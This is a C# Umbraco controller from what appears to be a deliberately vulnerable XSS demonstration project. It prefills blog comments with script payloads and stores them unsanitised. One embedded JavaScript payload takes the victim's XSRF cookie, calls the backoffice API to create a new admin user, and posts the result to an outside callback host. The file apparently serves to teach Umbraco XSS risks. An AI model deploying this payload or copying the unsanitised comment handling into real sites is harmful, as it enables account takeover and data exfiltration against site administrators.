using System.Linq;
using System.Web.Mvc;
using Umbraco.Core.Scoping;
using Umbraco.Web.Mvc;
using UmbXSS.Models;
using static UmbXSS.Components.AddCommentsTable;

namespace UmbXSS.Controllers
{
    public class BlogCommentsController : SurfaceController
    {
        private IScopeProvider _scopeProvider;

        public BlogCommentsController(IScopeProvider scopeProvider)
        {
            _scopeProvider = scopeProvider;
        }

        [ChildActionOnly]
        public ActionResult CommentsList()
        {
            using (var scope = _scopeProvider.CreateScope(autoComplete: true))
            {
                var sql = scope.SqlContext.Sql().Select("*").From("BlogComments")
                    .Where("BlogPostUmbracoId = @0", CurrentPage.Id);
                var comments = scope.Database.Fetch<BlogCommentSchema>(sql)
                    .Select(x => new BlogCommentViewModel { Name = x.Name, Message = x.Message });
                return PartialView(comments);
            }
        }

        [ChildActionOnly]
        public ActionResult CommentForm()
        {
            BlogCommentViewModel model = new BlogCommentViewModel { Name = "John Smith" };

            switch (CurrentPage.Name)
            {
                case "XSS Demo 1":
                    model.Message = "Great article!\n<script>alert(1)</script>";
                    break;
                case "XSS Demo 2":
                    model.Message = $"Fantastic article!\n<script>{CreateUserPayload}</script>";
                    break;
                case "XSS Demo 3":
                    model.Message = "Unreal article!\n<script src='[URL]'></script>";
                    break;
                default:
                    break;
            }

            return PartialView(model);
        }

        [HttpPost]
        [ValidateUmbracoFormRouteString]
        public ActionResult SubmitComment(BlogCommentViewModel model)
        {
            if (!ModelState.IsValid)
            {
                return CurrentUmbracoPage();
            }

            using (var scope = _scopeProvider.CreateScope(autoComplete: true))
            {
                scope.Database.Insert(new BlogCommentSchema
                {
                    BlogPostUmbracoId = CurrentPage.Id,
                    Name = model.Name,
                    Message = model.Message,
                });
            }

            return RedirectToCurrentUmbracoPage();
        }

        private string CreateUserPayload = @"
// Payload configuration
const userName = ""Tester"";
const userEmail = ""tester@demo.umbsec.icu"";
const userGroups = [""admin""];
const callbackURL = ""http://kali.umbsec.icu/"";

(async function () {
  // Create user object
  const data = {
    id: -1,
    parentId: -1,
    name: userName,
    email: userEmail,
    userGroups: userGroups,
  };

  // Call create user API
  const response = await fetch(
    ""/umbraco/backoffice/UmbracoApi/Users/PostCreateUser"",
    {
      method: ""POST"",
      body: JSON.stringify(data),
      // Ensure cookies (specifically the Umbraco auth cookie) are sent with the request.
      credentials: ""include"",
      headers: {
        // Umbraco's XSRF token needs to be passed in a custom header.
        // This is set in a non-HttpOnly cookie so we can retrieve it in JavaScript.
        ""x-umb-xsrf-token"": getCookie(""UMB-XSRF-TOKEN""),
        ""Content-Type"": ""application/json"",
      },
    }
  );

  // Parse response and send to the callback URL
  const json = toJSON(fromJSON(await response.text()));
  await fetch(callbackURL, {
    method: ""POST"",
    body: json,
  });

  /* 
   * Helper Functions
   */

  function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split("";"").shift();
  }

  function fromJSON(responseText) {
    // Remove XSSI prevention prefix from response body before parsing
    return JSON.parse(responseText.slice(6));
  }

  function toJSON(object) {
    // Pretty print with an indent of 2 spaces
    return JSON.stringify(object, null, 2);
  }
})();
";
    }
}